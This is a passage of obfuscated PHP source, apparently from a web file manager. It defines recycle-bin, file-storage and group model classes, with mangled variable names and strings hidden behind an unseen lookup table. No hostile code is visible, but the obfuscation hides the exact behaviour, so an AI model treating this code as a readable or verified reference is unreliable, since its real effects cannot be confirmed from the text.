$«Š¯Ê÷ø; } public function fileNameAuto($¹ò˜¡„, $íæº¶îş, $üßÂº›ü = REPEAT_RENAME, $İ˜‰õÃ = false) { $² í•Ææ =& $_SERVER[Æ š¦İÈ]; $ç½ëä©² = array($² í•Ææ[500] => $¹ò˜¡„, $² í•Ææ[433] => 0, $² í•Ææ[32] => array($² í•Ææ[380], $íæº¶îş . $² í•Ææ[381])); $®û¿Ú = $this->field($² í•Ææ[32])->where($ç½ëä©²)->select(); $Ô—äÃÍƒ = array_to_keyvalue($®û¿Ú, $² í•Ææ[12], $² í•Ææ[32]); return $this->fileNameAutoGet($Ô—äÃÍƒ, $íæº¶îş, $üßÂº›ü, $İ˜‰õÃ); } public function fileNameAutoGet($¬¾¥£öº, $ÄøïÛ¦ª, $¡©”å¯†, $æ™ÄÏ«•) { $»Æ›óçı =& $_SERVER[Æ š¦İÈ]; if ($¡©”å¯† == REPEAT_REPLACE || !$¬¾¥£öº || !in_array_not_case($ÄøïÛ¦ª, $¬¾¥£öº) || $æ™ÄÏ«• && $¡©”å¯† != REPEAT_RENAME_FOLDER) { return $ÄøïÛ¦ª; } if ($¡©”å¯† == REPEAT_SKIP) { return !1; } $à¯çœ = $»Æ›óçı[10] . get_path_ext($ÄøïÛ¦ª); $à¯çœ = $à¯çœ == $»Æ›óçı[10] || $æ™ÄÏ«• ? $»Æ›óçı[12] : $à¯çœ; for ($÷‚Š¯‰¬ = 1; $÷‚Š¯‰¬ <= count($¬¾¥£öº) + 1; $÷‚Š¯‰¬++) { $ÂûÃêº´ = substr($ÄøïÛ¦ª, 0, strlen($ÄøïÛ¦ª) - strlen($à¯çœ)); $­á£·–ù = $ÂûÃêº´ . "\x28{$÷‚Š¯‰¬}\x29{$à¯çœ}"; if (!in_array_not_case($­á£·–ù, $¬¾¥£öº)) { return $­á£·–ù; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\145\x5f\x72\145\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\x54\151\155\145", "\x74\x69\155\x65", "\151\x6e\x73\145\162\164", "\146\x75\156\x63\x74\151\x6f\x6e")); public function listData($¯Ò Â¦– = false) { $Èö³¾Ğ =& $_SERVER[Æ š¦İÈ]; $¯Ò Â¦– = $¯Ò Â¦– ? $¯Ò Â¦– : USER_ID; $ì•¿°æŸ = $this->where(array($Èö³¾Ğ[1635] => $¯Ò Â¦–))->select(); return array_to_keyvalue($ì•¿°æŸ, $Èö³¾Ğ[12], $Èö³¾Ğ[405]); } public function moveToRecycle($ˆ‡âßîŸ) { $üÑ´ÏúŸ =& $_SERVER[Æ š¦İÈ]; $§¢ä³¦õ = Model($üÑ´ÏúŸ[1316]); $—¾Â³¸É = $§¢ä³¦õ->sourceInfo($ˆ‡âßîŸ); if (!$—¾Â³¸É || $—¾Â³¸É[$üÑ´ÏúŸ[433]] == $üÑ´ÏúŸ[89]) { return; } $ÉÍ¿ùı¼ = array($üÑ´ÏúŸ[420] => $ˆ‡âßîŸ, $üÑ´ÏúŸ[1635] => USER_ID, $üÑ´ÏúŸ[582] => $—¾Â³¸É[$üÑ´ÏúŸ[414]], $üÑ´ÏúŸ[583] => $—¾Â³¸É[$üÑ´ÏúŸ[506]], $üÑ´ÏúŸ[586] => $—¾Â³¸É[$üÑ´ÏúŸ[523]]); $this->add($ÉÍ¿ùı¼); $this->recycleMove($ˆ‡âßîŸ, 1); if ($—¾Â³¸É[$üÑ´ÏúŸ[413]] == $üÑ´ÏúŸ[89]) { $Óãä¦Úå = array($üÑ´ÏúŸ[586] => array($üÑ´ÏúŸ[546], $—¾Â³¸É[$üÑ´ÏúŸ[523]] . $ˆ‡âßîŸ . $üÑ´ÏúŸ[547])); $§¢ä³¦õ->where($Óãä¦Úå)->setField($üÑ´ÏúŸ[433], 1); } } public function clear() { $this->remove(!1); } public function remove($ÉóÍ´½Ö = false, $³É†î³Œ = false) { $·¬ğıá =& $_SERVER[Æ š¦İÈ]; $³É†î³Œ = $³É†î³Œ ? $³É†î³Œ : USER_ID; $ÆÕúê¶ = Model($·¬ğıá[1316]); $Ïå•§´‹ = $this->listData($³É†î³Œ); $ÉóÍ´½Ö = $ÉóÍ´½Ö === !1 ? !1 : $ÉóÍ´½Ö; $ÖÎîÚè¹ = array(); foreach ($Ïå•§´‹ as $’´•ã) { if ($ÉóÍ´½Ö != !1 && !in_array($’´•ã, $ÉóÍ´½Ö)) { continue; } $ç ³„ü = $ÆÕúê¶->sourceInfo($’´•ã); $ÆÕúê¶->remove($’´•ã, !1); $ÍºÑË„ = $ç ³„ü[$·¬ğıá[414]] . $·¬ğıá[11] . $ç ³„ü[$·¬ğıá[506]]; $ÖÎîÚè¹[$ÍºÑË„] = array($·¬ğıá[582] => $ç ³„ü[$·¬ğıá[414]], $·¬ğıá[506] => $ç ³„ü[$·¬ğıá[506]]); $this->where(array($·¬ğıá[405] => $’´•ã))->delete(); } foreach ($ÖÎîÚè¹ as $ÛıÒê¯ğ) { $ÆÕúê¶->targetSpaceUpdate($ÛıÒê¯ğ[$·¬ğıá[414]], $ÛıÒê¯ğ[$·¬ğıá[506]]); } } public function restore($¼Ü¹ë¸¿ = false) { $ Éê„ = $this->listData(); $this->_restoreSource($ Éê„, $¼Ü¹ë¸¿); } public function removeUserAll($Ä‚»óî¨) { $this->remove(!1, $Ä‚»óî¨); } private function _restoreSource($ ®»¨Ì¼, $ı„¼Ğöò) { $á¯ğş‰… =& $_SERVER[Æ š¦İÈ]; $­ûïŸ» = Model($á¯ğş‰…[1316]); $ı„¼Ğöò = $ı„¼Ğöò == !1 ? !1 : $ı„¼Ğöò; if (!$ ®»¨Ì¼) { return !0; } $ÔÊ›¥´Ç = array(); foreach ($ ®»¨Ì¼ as $éÕÖ¸ëÆ) { if ($ı„¼Ğöò != !1 && !in_array($éÕÖ¸ëÆ, $ı„¼Ğöò)) { continue; } $õ¡ÆÌøˆ = $­ûïŸ»->sourceInfo($éÕÖ¸ëÆ); $ó›Æ™ôš = $­ûïŸ»->sourceInfo($õ¡ÆÌøˆ[$á¯ğş‰…[500]]); if ($ó›Æ™ôš[$á¯ğş‰…[433]] == $á¯ğş‰…[89]) { continue; } $­ûïŸ»->lockMoveStart($éÕÖ¸ëÆ); $this->recycleMove($éÕÖ¸ëÆ, 0); if ($õ¡ÆÌøˆ[$á¯ğş‰…[413]] == $á¯ğş‰…[89]) { $³Ÿ£º‘ê = array($á¯ğş‰…[586] => array($á¯ğş‰…[546], $õ¡ÆÌøˆ[$á¯ğş‰…[523]] . $éÕÖ¸ëÆ . $á¯ğş‰…[547])); $­ûïŸ»->where($³Ÿ£º‘ê)->setField($á¯ğş‰…[433], 0); $this->restoreFolderChildren($éÕÖ¸ëÆ, $ ®»¨Ì¼); } $this->where(array($á¯ğş‰…[405] => $éÕÖ¸ëÆ))->delete(); $­ûïŸ»->folderSizeReset($õ¡ÆÌøˆ[$á¯ğş‰…[500]]); $ÔÊ›¥´Ç[] = $õ¡ÆÌøˆ[$á¯ğş‰…[500]]; if ($õ¡ÆÌøˆ[$á¯ğş‰…[413]] == $á¯ğş‰…[89]) { $ÔÊ›¥´Ç[] = $éÕÖ¸ëÆ; } $­ûïŸ»->lockMoveEnd($éÕÖ¸ëÆ); } $­ûïŸ»->updateModifyTime($ÔÊ›¥´Ç); } private function restoreFolderChildren($ÀÁâÁÎ, $’·íû›è) { $äÖ°üŞˆ =& $_SERVER[Æ š¦İÈ]; $İâ¥öòÉ = Model($äÖ°üŞˆ[1316]); $”İæÕÓŠ = array($äÖ°üŞˆ[405] => array($äÖ°üŞˆ[7], array())); foreach ($’·íû›è as $œ‹”Ÿ±Î) { if ($œ‹”Ÿ±Î == $ÀÁâÁÎ) { continue; } if (!$İâ¥öòÉ->isParentOf($ÀÁâÁÎ, $œ‹”Ÿ±Î)) { continue; } $Áª¿æêõ = $İâ¥öòÉ->sourceInfo($œ‹”Ÿ±Î); if ($Áª¿æêõ[$äÖ°üŞˆ[413]] == $äÖ°üŞˆ[89]) { $”İæÕÓŠ[] = array($äÖ°üŞˆ[586] => array($äÖ°üŞˆ[546], $Áª¿æêõ[$äÖ°üŞˆ[523]] . $œ‹”Ÿ±Î . $äÖ°üŞˆ[547])); } else { $”İæÕÓŠ[$äÖ°üŞˆ[405]][1][] = $œ‹”Ÿ±Î; } } if (!$”İæÕÓŠ[$äÖ°üŞˆ[405]][1]) { unset($”İæÕÓŠ[$äÖ°üŞˆ[405]]); } if (!$”İæÕÓŠ) { return; } $”İæÕÓŠ[$äÖ°üŞˆ[405]][1] = array_unique($”İæÕÓŠ[$äÖ°üŞˆ[405]][1]); $”İæÕÓŠ[$äÖ°üŞˆ[991]] = $äÖ°üŞˆ[1907]; $İâ¥öòÉ->where($”İæÕÓŠ)->setField($äÖ°üŞˆ[433], 1); } private function recycleMove($à³Ÿã–¹, $¾Ëéô­ë = 1) { $¢¨ı‚ˆó =& $_SERVER[Æ š¦İÈ]; $ ²œ±‚£ = Model($¢¨ı‚ˆó[1316]); $æÇ¾—ñÈ = Model($¢¨ı‚ˆó[2114]); $¿ª„ü‰ı = array($¢¨ı‚ˆó[405] => $à³Ÿã–¹); if ($¾Ëéô­ë) { $ ²œ±‚£->where($¿ª„ü‰ı)->setField($¢¨ı‚ˆó[433], 1); $æÇ¾—ñÈ->eventRecycle($à³Ÿã–¹, $¢¨ı‚ˆó[2115]); } else { $­µü² = $ ²œ±‚£->where($¿ª„ü‰ı)->find(); $¸‘Ï£ü = $­µü²[$¢¨ı‚ˆó[413]] == $¢¨ı‚ˆó[89]; $Æá—õ½ = $ ²œ±‚£->fileNameAuto($­µü²[$¢¨ı‚ˆó[500]], $­µü²[$¢¨ı‚ˆó[32]], REPEAT_RENAME_FOLDER, $¸‘Ï£ü); if ($Æá—õ½ != $­µü²[$¢¨ı‚ˆó[32]]) { $ ²œ±‚£->rename($à³Ÿã–¹, $Æá—õ½); } $ ²œ±‚£->where($¿ª„ü‰ı)->setField($¢¨ı‚ˆó[433], 0); $æÇ¾—ñÈ->eventRecycle($à³Ÿã–¹, $¢¨ı‚ˆó[2116]); } } } goto F‡“’¼ÀÔ; E©½„ˆ“—§: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\x6d\x65" => "\x69\157\137\x66\x69\154\x65\x5f\155\x65\x74\141", "\155\145\x74\x61\106\151\x65\154\x64" => "\x66\151\154\x65\x49\104"); public function fileInfo($ë©°Ğ¹) { $ËÅÉ±§¸ =& $_SERVER[Æ š¦İÈ]; static $»˜ÙÍ‚ = array(); if (!isset($»˜ÙÍ‚[$ë©°Ğ¹])) { $ÚÌº¤Šæ = $ËÅÉ±§¸[1860]; $Ã†Ñí’Í = Model($ËÅÉ±§¸[472])->field($ÚÌº¤Šæ)->where(array($ËÅÉ±§¸[470] => $ë©°Ğ¹))->find(); $»˜ÙÍ‚[$ë©°Ğ¹] = $Ã†Ñí’Í; } return $»˜ÙÍ‚[$ë©°Ğ¹]; } public function addFileByContent($Íı’¤Ã = '', $ğµçÍª = '') { $ßôíùÛ =& $_SERVER[Æ š¦İÈ]; $ÎâŞà£Î = TEMP_PATH . $ßôíùÛ[1861]; if (!is_dir($ÎâŞà£Î)) { mk_dir($ÎâŞà£Î); } $Á®ŒĞ­í = $ÎâŞà£Î . $ßôíùÛ[1862] . rand_string(16); file_put_contents($Á®ŒĞ­í, $Íı’¤Ã); $òÉ³«Ñ¢ = $this->addFile($Á®ŒĞ­í, $ğµçÍª, !0); if (file_exists($Á®ŒĞ­í)) { @unlink($Á®ŒĞ­í); } return $òÉ³«Ñ¢; } public function createFileName($ı½¹î», $Šï´¬Â = false, $³ÉÁ†êš = false) { $öüÍë¯£ =& $_SERVER[Æ š¦İÈ]; $Şâæ†‘à = IO::init($öüÍë¯£[8]); $“âÑıÕ˜ = $this->makeFilePath($ı½¹î», $Şâæ†‘à, $Šï´¬Â, $³ÉÁ†êš); $¿î¼À…Ä = $Şâæ†‘à->pathFather($“âÑıÕ˜); static $²ÊğşŞŸ = false; $ß»¹†ËÚ = $öüÍë¯£[1863] . md5($¿î¼À…Ä); if (!$²ÊğşŞŸ && !Cache::get($ß»¹†ËÚ)) { $²ÊğşŞŸ = !0; $–”°£¿Ù = IO::mkdir($¿î¼À…Ä); if (!IO::exist($–”°£¿Ù . $öüÍë¯£[794])) { IO::mkfile($–”°£¿Ù . $öüÍë¯£[794]); } Cache::set($ß»¹†ËÚ, 1, 3600 * 2); } return $“âÑıÕ˜; } public function makeFilePath($óƒ„–Ğµ, $²ˆÄ¯¶ƒ, $Ê—¼ÎÏË = false, $Èı½Ğå» = false) { $¸ï—İëõ =& $_SERVER[Æ š¦İÈ]; $È™äìòë = Model($¸ï—İëõ[767])->get($¸ï—İëõ[1864]); $ø¤…¼ñ = KodIO::defaultIO() . date($¸ï—İëõ[1865]); $ß’†Ö€³ = $ø¤…¼ñ . rand_string(5) . short_id(100); $óƒ„–Ğµ = str_replace($¸ï—İëõ[8], $¸ï—İëõ[11], KodIO::clear($óƒ„–Ğµ)); $ĞÊ—é„ = $²ˆÄ¯¶ƒ->ext($óƒ„–Ğµ); if (!$óƒ„–Ğµ) { $È™äìòë = $¸ï—İëõ[1866]; } switch ($È™äìòë) { case $¸ï—İëõ[1867]: $ß’†Ö€³ = $ß’†Ö€³ . $¸ï—İëõ[10] . $²ˆÄ¯¶ƒ->ext($óƒ„–Ğµ); if ($ĞÊ—é„ == $¸ï—İëõ[1805]) { $ß’†Ö€³ .= $¸ï—İëõ[1540]; } break; case $¸ï—İëõ[1868]: $¢§ËÇÓå = Model($¸ï—İëõ[767])->get($¸ï—İëõ[768]); $«óï¦éİ = substr(md5($¸ï—İëõ[769] . $¢§ËÇÓå . date($¸ï—İëõ[745])), 0, 8); $°¿²ÂŸ‚ = KodIO::defaultDriver(); $ø¤…¼ñ = $¸ï—İëõ[1218] . $°¿²ÂŸ‚[$¸ï—İëõ[403]] . $¸ï—İëõ[412] . date($¸ï—İëõ[1869]) . $«óï¦éİ . $¸ï—İëõ[8]; if ($ĞÊ—é„ == $¸ï—İëõ[1805]) { $óƒ„–Ğµ .= $¸ï—İëõ[1540]; } $¤±Ñùâ¨ = $¸ï—İëõ[1870] . $ø¤…¼ñ . $óƒ„–Ğµ; CacheLock::lock($¤±Ñùâ¨); $ß’†Ö€³ = $ø¤…¼ñ . $óƒ„–Ğµ; if (IO::exist($ø¤…¼ñ . $óƒ„–Ğµ)) { $…õîû” = substr($óƒ„–Ğµ, 0, strlen($óƒ„–Ğµ) - strlen($ĞÊ—é„)); $¹Ğ›¦—Ê = $Èı½Ğå» ? substr($Èı½Ğå», 0, 5) : ($Ê—¼ÎÏË ? substr($Ê—¼ÎÏË, 0, 5) : rand_string(5)); $ß’†Ö€³ = $ø¤…¼ñ . $…õîû” . $¹Ğ›¦—Ê . $¸ï—İëõ[10] . $ĞÊ—é„; } if (IO::isTypeObject($ß’†Ö€³) && !IO::isUploadServer($ß’†Ö€³)) { if (IO::exist($ß’†Ö€³)) { return $ß’†Ö€³; } $ğ´¢™‹ = IO::setContent($ß’†Ö€³, $¸ï—İëõ[12]); if (!$ğ´¢™‹) { show_json($¸ï—İëõ[1871], !1); } } CacheLock::unlock($¤±Ñùâ¨); break; case $¸ï—İëõ[1866]: break; default: break; } return $ß’†Ö€³; } public function addFileByRemote($«á¢´¹ , $¿ÖÓ‰÷, $éØÎõá = array()) { $åÖ ¼®ñ =& $_SERVER[Æ š¦İÈ]; if (!IO::exist($«á¢´¹ )) { return !1; } $©÷Óæ×ï = $éØÎõá[$åÖ ¼®ñ[171]] ? $éØÎõá[$åÖ ¼®ñ[171]] : $åÖ ¼®ñ[12]; $ÓÙËœƒ = IO::hashMd5($«á¢´¹ , $©÷Óæ×ï); $åÈßŞ“Å = KodIO::defaultDriver(); $‘·‚©ÂÓ = array($åÖ ¼®ñ[581] => IO::size($«á¢´¹ ), $åÖ ¼®ñ[1872] => 1, $åÖ ¼®ñ[423] => $¿ÖÓ‰÷, $åÖ ¼®ñ[805] => $åÈßŞ“Å[$åÖ ¼®ñ[403]], $åÖ ¼®ñ[424] => $«á¢´¹ , $åÖ ¼®ñ[1873] => $éØÎõá[$åÖ ¼®ñ[172]] ? $éØÎõá[$åÖ ¼®ñ[172]] : IO::hashSimple($«á¢´¹ ), $åÖ ¼®ñ[1874] => $ÓÙËœƒ ? $ÓÙËœƒ : $©÷Óæ×ï); if ($À¹ûëë– = $this->addFileCheckExist($‘·‚©ÂÓ[$åÖ ¼®ñ[172]], $‘·‚©ÂÓ[$åÖ ¼®ñ[171]], $‘·‚©ÂÓ[$åÖ ¼®ñ[80]])) { return $À¹ûëë–; } return $this->addFileData($‘·‚©ÂÓ); } private function addFileData($Ø¤«·™) { $ÓõíÜ€¹ =& $_SERVER[Æ š¦İÈ]; if (!$Ø¤«·™) { return !1; } $Ø¤«·™[$ÓõíÜ€¹[80]] = intval($Ø¤«·™[$ÓõíÜ€¹[80]]); if (!$Ø¤«·™[$ÓõíÜ€¹[80]] && strlen($Ø¤«·™[$ÓõíÜ€¹[172]]) > 32) { $Ø¤«·™[$ÓõíÜ€¹[80]] = intval(substr($Ø¤«·™[$ÓõíÜ€¹[172]], 32)); } $Õ¯±ÉŠÚ = $this->add($Ø¤«·™); return $this->find($Õ¯±ÉŠÚ); } public function addFile($«ÇŠªÖö, $…£šºÅê, $¥¸Úëéâ = false) { $½‘¨¨•¨ =& $_SERVER[Æ š¦İÈ]; $Şè“Ï™û = IO::hashSimple($«ÇŠªÖö); $Ä‚€Æåğ = IO::size($«ÇŠªÖö); $«ªÉ˜ô× = $Ä‚€Æåğ <= 1024 * 1024 * 10 ? IO::hashMd5($«ÇŠªÖö) : $½‘¨¨•¨[12]; $­áÍ²Å¦ = $½‘¨¨•¨[1875] . $Şè“Ï™û; CacheLock::lock($­áÍ²Å¦); if ($«ªÉ˜ô× && $Şè“Ï™û) { $Èê¬¶­” = $this->addFileCheckExist($Şè“Ï™û, $«ªÉ˜ô×, $Ä‚€Æåğ); if ($Èê¬¶­”) { CacheLock::unlock($­áÍ²Å¦); return $Èê¬¶­”; } } $ëÈÇ¨„ú = $this->addFileMake($«ÇŠªÖö, $Ä‚€Æåğ, $Şè“Ï™û, $«ªÉ˜ô×, $…£šºÅê, $¥¸Úëéâ); $—Å‹Ìùé = $this->addFileData($ëÈÇ¨„ú); CacheLock::unlock($­áÍ²Å¦); if (!$«ªÉ˜ô× && $—Å‹Ìùé) { $this->fileMd5Check($—Å‹Ìùé); } return $—Å‹Ìùé; } private function fileMd5Check($ğ “ëª”) { $‡¹ø‰ã =& $_SERVER[Æ š¦İÈ]; $ÈË×Î˜Ú = array($ğ “ëª”[$‡¹ø‰ã[469]], $ğ “ëª”[$‡¹ø‰ã[78]]); $àÍ±™Ö‚ = $‡¹ø‰ã[1876] . $ğ “ëª”[$‡¹ø‰ã[78]]; $ûØÎ˜Ï” = $‡¹ø‰ã[1877] . $ğ “ëª”[$‡¹ø‰ã[469]]; $èõ‰åØç = TaskQueue::add($‡¹ø‰ã[1878], $ÈË×Î˜Ú, $àÍ±™Ö‚, $ûØÎ˜Ï”); if (!$èõ‰åØç) { $this->fileMd5Set($ğ “ëª”[$‡¹ø‰ã[469]], $ğ “ëª”[$‡¹ø‰ã[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Úéõ¼Ÿ, $¾ãÈ’»æ) { $éûÓ™ôí =& $_SERVER[Æ š¦İÈ]; $Û–­ş· = $this->find($Úéõ¼Ÿ); if (!$Û–­ş· || $Û–­ş·[$éûÓ™ôí[171]]) { return; } $ş®ïá´É = IO::hashMd5($¾ãÈ’»æ); if (!$ş®ïá´É) { return $éûÓ™ôí[12]; } $this->where(array($éûÓ™ôí[469] => $Úéõ¼Ÿ))->save(array($éûÓ™ôí[171] => $ş®ïá´É)); } public function addFileMake($—úïÅá›, $˜­¬Õµ£, $ôÊ²†Ñ±, $ÕÇ¹¡‘µ, $ ”ñÂÀ, $­¸®¿ïè) { $‹Š²ƒË˜ =& $_SERVER[Æ š¦İÈ]; $Å¯ª¯ŸŠ = $this->createFileName($ ”ñÂÀ, $ôÊ²†Ñ±, $ÕÇ¹¡‘µ); $Ú‹÷ÃÕ = get_path_father($Å¯ª¯ŸŠ); $ÈÕı›§ = get_path_this($Å¯ª¯ŸŠ); if ($­¸®¿ïè) { $³ïİœÏÍ = IO::move($—úïÅá›, $Ú‹÷ÃÕ, !1, $ÈÕı›§); } else { $³ïİœÏÍ = IO::copy($—úïÅá›, $Ú‹÷ÃÕ, !1, $ÈÕı›§); } if (!$³ïİœÏÍ) { return !1; } $õù“ÕÂ = KodIO::defaultDriver(); $•Á¼ëµ¢ = array($‹Š²ƒË˜[581] => $˜­¬Õµ£, $‹Š²ƒË˜[1872] => 1, $‹Š²ƒË˜[423] => $ ”ñÂÀ, $‹Š²ƒË˜[805] => $õù“ÕÂ[$‹Š²ƒË˜[403]], $‹Š²ƒË˜[424] => $Å¯ª¯ŸŠ, $‹Š²ƒË˜[1873] => $ôÊ²†Ñ±, $‹Š²ƒË˜[1874] => $ÕÇ¹¡‘µ); return $•Á¼ëµ¢; } public function addFileCheckExist($ôËŸîø, $º·öİœƒ, $®¤º Œ’) { $Œ®ÜÀ¯ =& $_SERVER[Æ š¦İÈ]; $†´ø¯‡ = $this->findByHash($ôËŸîø, $º·öİœƒ); if (!$†´ø¯‡) { return !1; } $‚à‹’ôì = array($Œ®ÜÀ¯[1872] => intval($†´ø¯‡[$Œ®ÜÀ¯[1879]]) + 1, $Œ®ÜÀ¯[581] => $®¤º Œ’); $this->where(array($Œ®ÜÀ¯[470] => $†´ø¯‡[$Œ®ÜÀ¯[469]]))->save($‚à‹’ôì); return $†´ø¯‡; } public function remove($ÎğìŸ­ ) { $this->linkCountChange($ÎğìŸ­ , !1); $this->clearEmpty(); return !0; } public function linkAdd($ƒè…ìÔ) { $this->linkCountChange($ƒè…ìÔ, !0); } public function linkCountChange($¾Úı–—Ş, $ŠÑÉğÕ) { $áŠ™µà¸ =& $_SERVER[Æ š¦İÈ]; if (!$¾Úı–—Ş) { return; } if (!is_array($¾Úı–—Ş)) { $¾Úı–—Ş = array($¾Úı–—Ş); } $¹­¯âÃÔ = array(); foreach ($¾Úı–—Ş as $€•³œ¿´) { $¼ñùŠ”à = $€•³œ¿´ . $áŠ™µà¸[12]; if (!$¹­¯âÃÔ[$¼ñùŠ”à]) { $¹­¯âÃÔ[$¼ñùŠ”à] = 0; } $¹­¯âÃÔ[$¼ñùŠ”à]++; } $¡¡ˆ‹©“ = array(); foreach ($¹­¯âÃÔ as $€•³œ¿´ => $¢ÑÑÄš­) { $¼ñùŠ”à = $¢ÑÑÄš­ . $áŠ™µà¸[12]; if (!$¡¡ˆ‹©“[$¼ñùŠ”à]) { $¡¡ˆ‹©“[$¼ñùŠ”à] = array(); } $¡¡ˆ‹©“[$¼ñùŠ”à][] = $€•³œ¿´; } foreach ($¡¡ˆ‹©“ as $¢ÑÑÄš­ => $Ñá³‹‘½) { if (!$Ñá³‹‘½) { continue; } $¢ÑÑÄš­ = $ŠÑÉğÕ ? $¢ÑÑÄš­ : -intval($¢ÑÑÄš­); $õè—«à = array($áŠ™µà¸[469] => array($áŠ™µà¸[7], $Ñá³‹‘½)); if ($¢ÑÑÄš­ < 0) { $õè—«à[$áŠ™µà¸[1879]] = array($áŠ™µà¸[1006], abs($¢ÑÑÄš­)); } $this->where($õè—«à)->setAdd($áŠ™µà¸[1879], $¢ÑÑÄš­); } } public function findByHash($§ø±ˆëæ, $ÉßŒÍ¸ = false) { $¹ÖŞ’Ì´ =& $_SERVER[Æ š¦İÈ]; if (!$§ø±ˆëæ && !$ÉßŒÍ¸) { return !1; } $ğ×ş¬£ = array($¹ÖŞ’Ì´[1873] => $§ø±ˆëæ); if ($ÉßŒÍ¸) { $ğ×ş¬£ = array($¹ÖŞ’Ì´[1874] => $ÉßŒÍ¸); } return $this->order($¹ÖŞ’Ì´[1880])->where($ğ×ş¬£)->find(); } public function clearEmpty($²Œ®¼ê  = 0) { $ì‰îêÒŞ =& $_SERVER[Æ š¦İÈ]; $İÇµğïÈ = time() - 3600 * 24 * $²Œ®¼ê ; $‚˜ˆ©ÂÖ = $ì‰îêÒŞ[1881] . $İÇµğïÈ; $©˜É¤Û‹ = $this->where($‚˜ˆ©ÂÖ)->select(); if (!$©˜É¤Û‹) { return; } $¹›“”™° = new Task($ì‰îêÒŞ[1882], $ì‰îêÒŞ[12], count($©˜É¤Û‹)); foreach ($©˜É¤Û‹ as $şÉÇà—Õ) { $¹›“”™°->update(1); $this->resetFile($şÉÇà—Õ); } $¹›“”™°->end(); } public function resetFile($áĞ ÑŠö) { $¼ÔºÅï =& $_SERVER[Æ š¦İÈ]; $‘Êö£Ä = array($¼ÔºÅï[470] => $áĞ ÑŠö[$¼ÔºÅï[469]]); $ÏğéŒî = Model($¼ÔºÅï[1316])->where($‘Êö£Ä)->count(); $ÁÂª°îğ = Model($¼ÔºÅï[1883])->where($‘Êö£Ä)->count(); $’ûšûª = intval($ÏğéŒî) + intval($ÁÂª°îğ); if ($’ûšûª == 0) { IO::remove($áĞ ÑŠö[$¼ÔºÅï[78]]); Model($¼ÔºÅï[1884])->delete($áĞ ÑŠö[$¼ÔºÅï[469]]); $this->where($‘Êö£Ä)->delete(); $this->metaSet($áĞ ÑŠö[$¼ÔºÅï[469]], null, null); return; } if ($áĞ ÑŠö[$¼ÔºÅï[1879]] != $’ûšûª) { $this->where($‘Êö£Ä)->save(array($¼ÔºÅï[1872] => $’ûšûª)); } } public function storageInfo($±íş°ïÚ = false) { $‡Üü¼›Í =& $_SERVER[Æ š¦İÈ]; $şÓ¤ã³½ = $this->count() + 0.0; $¨ºşöÕ = 0; $¬±ô¿ƒ² = 1; $§˜åå£¶ = 0; $¢¾Ë‰µÒ = 5000; for ($ÓÉôÂ¾´ = 0; $ÓÉôÂ¾´ < $şÓ¤ã³½; $ÓÉôÂ¾´ = $ÓÉôÂ¾´ + $¢¾Ë‰µÒ) { $•œ÷ «È = $this->limit($ÓÉôÂ¾´, $ÓÉôÂ¾´ + $¢¾Ë‰µÒ)->select(); foreach ($•œ÷ «È as $ÛëıòË) { $¬±ô¿ƒ² += $ÛëıòË[$‡Üü¼›Í[80]] * $ÛëıòË[$‡Üü¼›Í[1879]]; $¨ºşöÕ += $ÛëıòË[$‡Üü¼›Í[80]] * ($ÛëıòË[$‡Üü¼›Í[1879]] - 1); $§˜åå£¶ += $ÛëıòË[$‡Üü¼›Í[1879]]; } } $”·´‰ÚÔ = array($‡Üü¼›Í[1885] => $¬±ô¿ƒ², $‡Üü¼›Í[1886] => $¨ºşöÕ, $‡Üü¼›Í[1887] => $¨ºşöÕ / $¬±ô¿ƒ², $‡Üü¼›Í[84] => $şÓ¤ã³½, $‡Üü¼›Í[1888] => $§˜åå£¶); return $”·´‰ÚÔ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\145" => "\x67\x72\x6f\x75\x70\x5f\155\x65\164\141", "\x6d\x65\164\x61\106\151\x65\x6c\x64" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($ï«ğÁÓœ) { $Õ¹³­şœ =& $_SERVER[Æ š¦İÈ]; return array($Õ¹³­şœ[1889] => array($ï«ğÁÓœ[0], $Õ¹³­şœ[1890]), $Õ¹³­şœ[1891] => array($ï«ğÁÓœ[0], $Õ¹³­şœ[1892])); } protected function getInfo($ûÆ¾øå, $ˆ¬¢ì¦Á = false) { $ƒ¯ğì“ë = $this->getInfoSimple($ûÆ¾øå); if (!$ƒ¯ğì“ë) { return !1; } if ($ˆ¬¢ì¦Á) { return $this->_listDataApplyItem($ƒ¯ğì“ë); } return $this->cacheFunctionGet($_SERVER[Æ š¦İÈ][1893], $ûÆ¾øå); } protected function getInfoSimple($‹Îêû, $ë §Óú = false) { $À„úÆÌâ =& $_SERVER[Æ š¦İÈ]; if ($ë §Óú) { $ÂŞ÷Ñéó = array($À„úÆÌâ[1812] => intval($‹Îêû)); $ıÄ¶­¼ = $this->where($ÂŞ÷Ñéó)->find(); return is_array($ıÄ¶­¼) ? $ıÄ¶­¼ : array(); } return $this->cacheFunctionGet($À„úÆÌâ[1894], $‹Îêû); } protected function groupAdd($™ûÍ¾—ğ) { $ïÈˆû½ =& $_SERVER[Æ š¦İÈ]; if (!$™ûÍ¾—ğ[$ïÈˆû½[500]] && isset($™ûÍ¾—ğ[$ïÈˆû½[1812]]) && $™ûÍ¾—ğ[$ïÈˆû½[1812]] == 1) { if ($Ê¬¾ù¬É = $this->getInfoSimple($™ûÍ¾—ğ[$ïÈˆû½[1812]], !0)) { return $™ûÍ¾—ğ[$ïÈˆû½[1812]]; } } else { $Ê¬¾ù¬É = $this->getInfoSimple($™ûÍ¾—ğ[$ïÈˆû½[500]]); if (!$Ê¬¾ù¬É) { return !1; } } $ï şáä” = $ïÈˆû½[533]; if ($Ê¬¾ù¬É[$ïÈˆû½[523]]) { $ï şáä” = $Ê¬¾ù¬É[$ïÈˆû½[523]] . $Ê¬¾ù¬É[$ïÈˆû½[1812]] . $ïÈˆû½[50]; } $ÅÆÙ™± = array($ïÈˆû½[423] => $this->groupNameAuto($™ûÍ¾—ğ[$ïÈˆû½[500]], $™ûÍ¾—ğ[$ïÈˆû½[32]]), $ïÈˆû½[404] => $™ûÍ¾—ğ[$ïÈˆû½[500]], $ïÈˆû½[586] => $ï şáä”, 